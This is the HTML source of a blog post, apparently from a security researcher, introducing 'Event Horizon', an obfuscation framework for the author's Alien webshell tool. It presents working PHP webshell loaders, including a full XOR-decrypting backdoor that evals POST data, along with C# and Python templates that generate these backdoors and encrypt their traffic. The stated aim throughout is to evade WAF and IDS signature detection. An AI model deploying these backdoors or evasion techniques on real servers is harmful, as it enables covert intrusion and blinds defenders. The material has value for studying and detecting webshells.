@@ -1,0 +1,296 @@
+<!DOCTYPE html><html lang="en-us" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Event Horizon: An Obfuscation Framework of Alien | ISSAC/iss4cf0ng's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+ menuSettings: {
+   zoom: "None"
+ },
+ showMathMenu: false,
+ jax: ["input/TeX","output/CommonHTML"],
+ extensions: ["tex2jax.js"],
+ TeX: {
+   extensions: ["AMSmath.js","AMSsymbols.js"],
+   equationNumbers: {
+     autoNumber: "AMS"
+   }
+ },
+ tex2jax: {
+   inlineMath: [["\\(", "\\)"]],
+   displayMath: [["\\[", "\\]"]]
+ }
+});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><script async src="https://www.googletagmanager.com/gtag/js?id=G-RQ7HTMYT8W"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-RQ7HTMYT8W');</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ISSAC/iss4cf0ng's blog" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/About/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/Alien/"><span class="navItemTitle">Alien</span></a></li><li class="navItem"><a class="navBlock" href="/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"><span class="navItemTitle">DuplexSpy</span></a></li><li class="navItem"><a class="navBlock" href="/Notes/"><span class="navItemTitle">Notes</span></a></li><li class="navItem"><a class="navBlock" href="/Series/"><span class="navItemTitle">Series</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Event Horizon: An Obfuscation Framework of Alien</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2026-07-21T06:30:17.000Z" id="date"> 2026-07-21</time></div></span><br><span>Last Update: <div class="control"><time datetime="2026-07-21T08:37:38.948Z" id="updated"> 2026-07-21</time></div></span><br><span>Word Count: <div class="control">1.8k</div></span><br><span>Read Time: <div class="control">10 min</div></span></div></div><hr><div id="post-content"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is part of the <strong>Inside Different Generations of WebShells</strong> series.</p>
+<p>In the previous articles, I introduced the design philosophy behind OneShells, NebulaPulsar, and Alien. Together, the provide a flexible framework for post-exploitation across multiple scripting languages and platforms.</p>
+<ol>
+<li><a href="/2026/07/20/2026-7-20-Webshell-Part1/">Understanding WebShells</a></li>
+<li><a href="/2026/07/20/2026-7-20-Webshell-Part2/">CGI WebShells</a></li>
+<li><a href="/2026/07/21/2026-7-21-Webshell-Part3/">Java and C#</a></li>
+</ol>
+<p>However, arbitrary code execution alone is not enough in real-world environments. Modern web application firewall (WAFs) and intrusion detection systems (IDSs) continue to improve, making static webshell traffic increasingly easy to detect.</p>
+<p>This article introduces <strong>Event Horizon</strong>, the obfuscation framework used by Alien. Rather than implementing a fixed obfuscation algorithm, Event Horizon provides a pluggable architecture that allows users to customized how HTTP requests and responses are transformed.</p>
+<p align="center" class='item-img' data-src='/images/meme/Rio/4.png'><img src="/images/meme/Rio/4.png" width=250/>
+</p>
+
+<h1 id="Issues-of-Detection"><a href="#Issues-of-Detection" class="headerlink" title="Issues of Detection"></a>Issues of Detection</h1><p>Traditional OneShells are simple and effective. They allow arbitrary code execution through a single HTTP request and are widely used during penetration testing and post-exploitation.</p>
+<p>Unfortunately, this simplicity also makes them easy to detect.</p>
+<p>For example, a traditional PHP OneShell typically contains a loader similar to the followings:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pass=@<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&#x27;Base64 payload&#x27;</span>));<br></code></pre></td></tr></table></figure>
+<p>Although the payload itself is encoded, the loader remains static. From the defender’s perspective, deteting signatures such as <code>eval(base64_decoded(</code> is often sufficient to identify malicious traffic.</p>
+<p>Moreover, the HTTP response is in plaintext, making the communication channel channel even more recognizable.</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-21-EventHorizon/1.png'><img src="/images/article/2026-7-21-EventHorizon/1.png" width=700/>
+</p>
+
+<p>As we can see in the screenshot above, not only the keyword is very obvious, also the result of executing a cmd command is obvious as well.</p>
+<h1 id="Existing-Solutions"><a href="#Existing-Solutions" class="headerlink" title="Existing Solutions"></a>Existing Solutions</h1><p>In the past, some researchers introduced more complicated loaders to solve the problem.</p>
+<p>For example:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&quot;ass&quot;</span>.<span class="hljs-string">&quot;ert&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;ev&quot;</span>.<span class="hljs-string">&quot;Al(\&quot;\\\$xx%3D\\\&quot;Ba&quot;</span>.<span class="hljs-string">&quot;SE6&quot;</span>.<span class="hljs-string">&quot;4_dEc&quot;</span>.<span class="hljs-string">&quot;OdE\\\&quot;;@ev&quot;</span>.<span class="hljs-string">&quot;al(\\\$xx(&#x27;Base64 payload&#x27;));\&quot;);&quot;</span>));<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-7-21-EventHorizon/2.png'><img src="/images/article/2026-7-21-EventHorizon/2.png" width=700/>
+</p>
+
+<p>These techniques certainly increase the complexity of the payload.</p>
+<p>However, they still rely on a static loader.</p>
+<p>Once defenders learn how the loader is constructed, new signatures can be added to WAFs or IDSs, resulting in the same detection problem.</p>
+<p>This naturally leads to a different philosophy:</p>
+<blockquote>
+<p>Instead of making the loader more complicated, why ot make both the loader and the communication fully customizable?</p>
+</blockquote>
+<p>This is the initial idea of <strong>EventHorizon</strong>. In truth, I removed all the features as possible as I can.</p>
+<h1 id="Event-Horizon"><a href="#Event-Horizon" class="headerlink" title="Event Horizon"></a>Event Horizon</h1><p>Instead of embedding obfuscation logic directly into Alien, Event Horizon runs as a lightweight local server.</p>
+<p>Whenever Alien is about to send an HTTP request, it forwards the payload to Event Horizon. Event Horizon then executes the selected tamper script, transforms the payload, and returns the obfuscated result back to Alien.</p>
+<p>This design separates the client from the obfuscation logic, allowing new tamper scripts to be added without modifying Alien itself.</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-21-EventHorizon/7.png'><img src="/images/article/2026-7-21-EventHorizon/7.png" width=800/>
+</p>
+
+<h1 id="Bilateral-Obfuscation"><a href="#Bilateral-Obfuscation" class="headerlink" title="Bilateral Obfuscation"></a>Bilateral Obfuscation</h1><h2 id="Request-Obfuscation"><a href="#Request-Obfuscation" class="headerlink" title="Request Obfuscation"></a>Request Obfuscation</h2><p>One of the design goals of Event Horizon is to obfuscate the entire communication channel rather than only the loader. Therefore, every HTTP request is processed by the selected tamper script before it is sent to the target server.</p>
+<p>The screenshot below shows an example using the <code>XOR</code> tamper script with the key <code>secret</code>:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-21-EventHorizon/4.png'><img src="/images/article/2026-7-21-EventHorizon/4.png" width=500/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-7-21-EventHorizon/3.png'><img src="/images/article/2026-7-21-EventHorizon/3.png" width=700/>
+</p>
+
+<p>As shown above, the original PHP payload is no longer visible in the HTTP request. Instead, the entire payload is encrypted using XOR and then encoded in Base64 before transmission. Consequently, traditional signatures such as <code>eval(base64_decoded())</code> are no longer exposed on the network.</p>
+<p>However, this imeediately introduces another problem.</p>
+<p>If the HTTP request contains only encrypted data, how can the target OneShell recover and execute the original payload?</p>
+<p>The solution is to generate a matching OneShell that contains the corresponding de-obfuscation routine. For example, when the XOR tamper script is selected, we can generates the following PHP OneShell:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">xor_crypt</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>, <span class="hljs-variable">$key</span></span>) </span>&#123;<br>    <span class="hljs-variable">$out</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$keyLength</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$dataLength</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$dataLength</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>]) ^ <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span> % <span class="hljs-variable">$keyLength</span>]));<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>&#125;<br><br><span class="hljs-variable">$KEY</span> = <span class="hljs-string">&quot;secret&quot;</span>;<br><span class="hljs-variable">$rawInput</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-variable">$encryptedBytes</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$rawInput</span>);<br><span class="hljs-variable">$decrypted</span> = <span class="hljs-title function_ invoke__">xor_crypt</span>(<span class="hljs-variable">$encryptedBytes</span>, <span class="hljs-variable">$KEY</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$decrypted</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>The generated OneShell first decodes the incoming Base64 data, decrypts it using the configured XOR key, and finally executes the recovered payload using eval().</p>
+<p>At first glance, this approach may appear less flexible than a traditional OneShell because the de-obfuscation routine is embedded inside the backdoor. In practice, however, this is simply the trade-off required for traffic obfuscation. The generated OneShell can still be protected using existing PHP obfuscation techniques, making reverse engineering significantly more difficult.</p>
+<p>To simplify development, Event Horizon also provides a backdoor builder integrated into Alien. Users only need to select a tamper script and its corresponding parameters, and Alien automatically generates a compatible OneShell.</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-21-EventHorizon/5.png'><img src="/images/article/2026-7-21-EventHorizon/5.png" width=700/>
+</p>
+
+<h2 id="Response-Obfuscation"><a href="#Response-Obfuscation" class="headerlink" title="Response Obfuscation"></a>Response Obfuscation</h2><p>Obfuscating only HTTP requests is not sufficient.</p>
+<p>Although the request payload is now encrypted, the HTTP response still exposes the execution result in plaintext. An observer can therefore still recover command output directly from the network traffic.</p>
+<p>To address this issue, EventHorizon also supports response obfuscation through <strong>Wrapping Functions</strong>.</p>
+<p>Whenever Alien generates a payload, it first queries the selected tamper script for a wrappign function. This wrapping function is then injected automatically into the generated payload before it is transmitted to the target.</p>
+<p>For example, the following code demonstrates how Alien injects wrapping functions for PHP and VBScrip payloads:</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> <span class="hljs-title">fnWrapPHP</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> szOriginalPayload, <span class="hljs-built_in">string</span> szEncryptor</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (szEncryptor == <span class="hljs-string">&quot;*&quot;</span>)<br>        <span class="hljs-keyword">return</span> szOriginalPayload;<br><br>    <span class="hljs-built_in">string</span> szHeader =<br>        <span class="hljs-string">&quot;\r\n&quot;</span> +<br>        (<span class="hljs-built_in">string</span>.IsNullOrEmpty(szEncryptor) ?<br>        <span class="hljs-string">&quot;function Encrypt($data) &#123;\r\n&quot;</span> +<br>        <span class="hljs-string">&quot;    // TODO: Add PHP encryption logic here\r\n&quot;</span> +<br>        <span class="hljs-string">&quot;    return $data;\r\n&quot;</span> +<br>        <span class="hljs-string">&quot;&#125;&quot;</span> : szEncryptor) +<br>        <span class="hljs-string">&quot;\r\n&quot;</span> +<br>        <span class="hljs-string">&quot;ob_start();\r\n\r\n&quot;</span>;<br><br>    <span class="hljs-built_in">string</span> szFooter =<br>        <span class="hljs-string">&quot;\r\n\r\n$globalStringOutput = ob_get_clean();\r\n&quot;</span> +<br>        <span class="hljs-string">&quot;echo Encrypt($globalStringOutput);\r\n&quot;</span> +<br>        <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-built_in">string</span> szProcessed = szOriginalPayload.Replace(<span class="hljs-string">&quot;&lt;?php&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).Replace(<span class="hljs-string">&quot;?&gt;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">$&quot;<span class="hljs-subst">&#123;szHeader&#125;</span><span class="hljs-subst">&#123;szProcessed&#125;</span><span class="hljs-subst">&#123;szFooter&#125;</span>&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> <span class="hljs-title">fnWrapVBScript</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> szOriginalPayload, <span class="hljs-built_in">string</span> szEncryptor</span>)</span><br>&#123;<br>    <span class="hljs-built_in">string</span> szProcessed = szOriginalPayload;<br>    szProcessed = Regex.Replace(szProcessed, <span class="hljs-string">@&quot;\bResponse\.Write\b&quot;</span>, <span class="hljs-string">&quot;globalStringOutput = globalStringOutput &amp; &quot;</span>, RegexOptions.IgnoreCase);<br>    szProcessed = Regex.Replace(szProcessed, <span class="hljs-string">@&quot;\becho\b&quot;</span>, <span class="hljs-string">&quot;globalStringOutput = globalStringOutput &amp; &quot;</span>, RegexOptions.IgnoreCase);<br><br>    <span class="hljs-keyword">if</span> (szEncryptor == <span class="hljs-string">&quot;*&quot;</span>)<br>        <span class="hljs-keyword">return</span> szProcessed;<br><br>    <span class="hljs-built_in">string</span> szVbEncryptor = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(szEncryptor))<br>    &#123;<br>        szVbEncryptor =<br>            <span class="hljs-string">&quot;Function Encrypt(data)\r\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &#x27; TODO: do something\r\n&quot;</span> +<br>            <span class="hljs-string">&quot;    Encrypt = data\r\n&quot;</span> +<br>            <span class="hljs-string">&quot;End Function\r\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        szVbEncryptor = szEncryptor;<br>    &#125;<br><br>    <span class="hljs-built_in">string</span> szHeader =<br>        <span class="hljs-string">&quot;\r\n&quot;</span> +<br>        <span class="hljs-string">&quot;Dim globalStringOutput\r\n&quot;</span> +<br>        <span class="hljs-string">&quot;globalStringOutput = \&quot;\&quot;\r\n\r\n&quot;</span> +<br>        szVbEncryptor + <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br><br>    <span class="hljs-built_in">string</span> szFooter = <span class="hljs-string">&quot;\r\n\r\nResponse.Write(Encrypt(globalStringOutput))\r\n&quot;</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">$&quot;<span class="hljs-subst">&#123;szHeader&#125;</span><span class="hljs-subst">&#123;szProcessed&#125;</span><span class="hljs-subst">&#123;szFooter&#125;</span>&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>Instead of writing directly to the HTTP response, the payload first stores its output inside an internal buffer. Once execution finishes, the injected wrapping function encrypts the buffered data before sending it back to Alien.</p>
+<p>As a result, both HTTP requests and HTTP responses are protected by the same tamper algorithm. The entire communication channel is therefore obfuscated, rather than only the initial payload.</p>
+<p>The screenshot below shows the final network traffic captured using Wireshark:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-21-EventHorizon/6.png'><img src="/images/article/2026-7-21-EventHorizon/6.png" width=700/>
+</p>
+
+<p>As a result, recognizable payload signatures and plaintext outputs are no longer directly observable in captured HTTP traffic.</p>
+<h2 id="How-to-Write-a-Tampering-Script"><a href="#How-to-Write-a-Tampering-Script" class="headerlink" title="How to Write a Tampering Script"></a>How to Write a Tampering Script</h2><p>One of the design goals of Event Horizon is extensibility.</p>
+<p>Adding a new tamper algorithm requires only a single Python module.</p>
+<p>First, open the directory <code>./Tamper/obfuscators</code>, and add a new tamper script <code>XOR.py</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Return the wrapping function for injection</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">obfuscator</span>(<span class="hljs-params">payload, script, key, **kwargs</span>):<br>    <span class="hljs-keyword">if</span> script <span class="hljs-keyword">in</span> dicObfuscator.keys():<br>        <span class="hljs-keyword">return</span> dicObfuscator[script].replace(<span class="hljs-string">&#x27;[XOR_KEY]&#x27;</span>, key)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># Return payload to Alien UI wizard</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build</span>(<span class="hljs-params">payload, script, key, **kwargs</span>):<br>    <span class="hljs-keyword">if</span> script <span class="hljs-keyword">in</span> dicPayload.keys():<br>        <span class="hljs-keyword">return</span> dicPayload[script].replace(<span class="hljs-string">&#x27;[XOR_KEY]&#x27;</span>, key)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># Return the example of parameters</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">example</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    <span class="hljs-keyword">return</span> json.dumps(PARAM_SCHEM, indent=<span class="hljs-number">4</span>)<br><br><span class="hljs-comment"># Just copy this for every tampering script</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">available</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    scripts = []<br>    <span class="hljs-keyword">for</span> script <span class="hljs-keyword">in</span> dicPayload.keys():<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> script <span class="hljs-keyword">in</span> dicObfuscator.keys():<br>            <span class="hljs-keyword">continue</span><br><br>        scripts.append(script)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;,&#x27;</span>.join(scripts)<br><br><span class="hljs-comment"># Obfuscate the HTTP POST data</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">obfuscate</span>(<span class="hljs-params">payload, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, key=<span class="hljs-string">&quot;secret&quot;</span>, **kwargs</span>):<br>    data_bytes = payload.encode(encoding)<br>    key_bytes = key.encode(encoding)<br>    <br>    out = <span class="hljs-built_in">bytearray</span>()<br>    key_len = <span class="hljs-built_in">len</span>(key_bytes)<br>    <span class="hljs-keyword">for</span> i, byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data_bytes):<br>        out.append(byte ^ key_bytes[i % key_len])<br>        <br>    <span class="hljs-keyword">return</span> base64.b64encode(<span class="hljs-built_in">bytes</span>(out)).decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br><br><span class="hljs-comment"># De-obfuscate the HTTP response</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">deobfuscate</span>(<span class="hljs-params">payload, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, key=<span class="hljs-string">&quot;default_key&quot;</span>, **kwargs</span>):<br>    encrypted_bytes = base64.b64decode(payload.encode(encoding))<br>    key_bytes = key.encode(encoding)<br>    <br>    decrypted_bytes = _xor_crypt(encrypted_bytes, key_bytes)<br>    <span class="hljs-keyword">return</span> decrypted_bytes.decode(encoding)<br></code></pre></td></tr></table></figure>
+<p>Also, add the description and parameters JSON:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">PARAM_SCHEM = &#123;<br>    <span class="hljs-string">&quot;key&quot;</span> : <span class="hljs-string">&quot;secret&quot;</span>,<br>    <span class="hljs-string">&quot;encoding&quot;</span> : <span class="hljs-string">&quot;utf-8&quot;</span><br>&#125;<br><br>HELP = <span class="hljs-string">&#x27;Obfuscate the payload with XOR.&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>Finally, don’t forget the obfuscator and payload template:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br>dicObfuscator = &#123;<br>    <span class="hljs-string">&#x27;PHP&#x27;</span> : textwrap.dedent(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        function Encrypt($data) &#123;</span><br><span class="hljs-string">            $key = &#x27;[XOR_KEY]&#x27;;</span><br><span class="hljs-string">            $out = &#x27;&#x27;;</span><br><span class="hljs-string">            $keyLength = strlen($key);</span><br><span class="hljs-string">            $dataLength = strlen($data);</span><br><span class="hljs-string"></span><br><span class="hljs-string">            for ($i = 0; $i &lt; $dataLength; $i++) &#123;</span><br><span class="hljs-string">                $out .= chr(ord($data[$i]) ^ ord($key[$i % $keyLength]));</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            return base64_encode($out);</span><br><span class="hljs-string">        &#125;                </span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>).strip(),<br>&#125;<br><br>dicPayload = &#123;<br>    <span class="hljs-string">&#x27;PHP&#x27;</span> : textwrap.dedent(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;?php</span><br><span class="hljs-string"></span><br><span class="hljs-string">        function xor_crypt($data, $key) &#123;</span><br><span class="hljs-string">            $out = &#x27;&#x27;;</span><br><span class="hljs-string">            $keyLength = strlen($key);</span><br><span class="hljs-string">            $dataLength = strlen($data);</span><br><span class="hljs-string"></span><br><span class="hljs-string">            for ($i = 0; $i &lt; $dataLength; $i++) &#123;</span><br><span class="hljs-string">                $out .= chr(ord($data[$i]) ^ ord($key[$i % $keyLength]));</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            return $out;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        $KEY = &quot;[XOR_KEY]&quot;;</span><br><span class="hljs-string">        $rawInput = file_get_contents(&quot;php://input&quot;);</span><br><span class="hljs-string">        $encryptedBytes = base64_decode($rawInput);</span><br><span class="hljs-string">        $decrypted = xor_crypt($encryptedBytes, $KEY);</span><br><span class="hljs-string">        eval($decrypted);</span><br><span class="hljs-string">                                            </span><br><span class="hljs-string">        ?&gt;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span>).strip(),<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>Once the script is placed inside the <code>./Tamper/obfuscators</code> directory, it automatically becomes available inside Alien.</p>
